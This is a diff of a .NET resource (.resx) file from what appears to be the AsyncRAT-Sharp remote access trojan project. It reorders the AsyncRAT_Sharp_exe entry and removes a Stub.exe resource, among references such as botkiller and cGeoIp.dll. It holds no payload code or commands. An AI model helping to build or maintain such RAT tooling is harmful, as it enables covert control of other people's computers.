@@ -136,9 +136,6 @@
   <data name="cGeoIp" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\cGeoIp.dll;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
   </data>
-  <data name="AsyncRAT_Sharp_exe" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\AsyncRAT-Sharp.exe.config;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
-  </data>
   <data name="botkiller" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\botkiller.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
@@ -181,13 +178,13 @@
   <data name="msgbox" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\msgbox.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
-  <data name="Stub" type="System.Resources.ResXFileRef, System.Windows.Forms">
-    <value>..\Resources\Stub.exe;System.Byte[], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
-  </data>
   <data name="visit" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\visit.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
   </data>
   <data name="settings" type="System.Resources.ResXFileRef, System.Windows.Forms">
     <value>..\Resources\settings.png;System.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a</value>
+  </data>
+  <data name="AsyncRAT_Sharp_exe" type="System.Resources.ResXFileRef, System.Windows.Forms">
+    <value>..\Resources\AsyncRAT-Sharp.exe.config;System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089;utf-8</value>
   </data>
 </root>
